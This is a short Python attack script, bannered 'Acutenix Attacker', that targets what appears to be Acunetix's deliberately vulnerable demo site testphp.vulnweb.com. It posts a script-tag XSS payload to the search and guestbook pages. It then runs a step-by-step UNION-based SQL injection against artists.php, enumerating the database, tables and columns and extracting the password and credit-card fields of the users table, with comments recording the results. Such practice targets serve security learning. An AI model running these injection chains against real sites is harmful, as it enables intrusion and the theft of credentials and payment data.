import requests

from pyfiglet import figlet_format
from colorama import init
from termcolor import cprint

ps_banner = figlet_format("Acutenix Attacker", font="cybermedium")
cprint(ps_banner, 'red')

print("-" * len(ps_banner.split("\n")[2]))

payload = "<script>alert(1337)</script>"

r = requests.post("http://testphp.vulnweb.com/search.php?test=query",
                  data={"searchFor": payload})
# print(r.text)

if payload.lower() in r.text.lower():
  print("/search.php is vulnerable to XSS")


r = requests.post("http://testphp.vulnweb.com/guestbook.php",
                  data={"text": payload})

if payload.lower() in r.text.lower():
  print("/guestbook.php is vulnerable to XSS")


r = requests.get(
    "http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3")
# print(r.text)

r = requests.get(
    "http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, database(), 3")
# print(r.text)  # database name 'acuart'

r = requests.get(
    "http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, version(), current_user()")
# print(r.text)  # acuart@localhost

r = requests.get(
    "http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database() LIMIT 0, 1")
# print(r.text)  # First table is "artists"

r = requests.get(
    "http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database() LIMIT 1, 1")
# print(r.text)  # Second table is "carts"

r = requests.get(
    "http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database() LIMIT 2, 1")
# Third table is "categ" (Similarly, we can go for table 4 through 7, viz "users") (Therefore, total 8 tables in DB)
# print(r.text)

r = requests.get("http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema = database()")
# All tables names 'artists,carts,categ,featured,guestbook,pictures,products,users'
# print(r.text)

r = requests.get("http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'")
# All column names 'address,cart,cc,email,name,pass,phone,uname'
# print(r.text)

r = requests.get(
    "http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, pass, cc FROM users WHERE uname='test'")
# print(r.text)

print("/artists.php is vulnerable to SQLi")
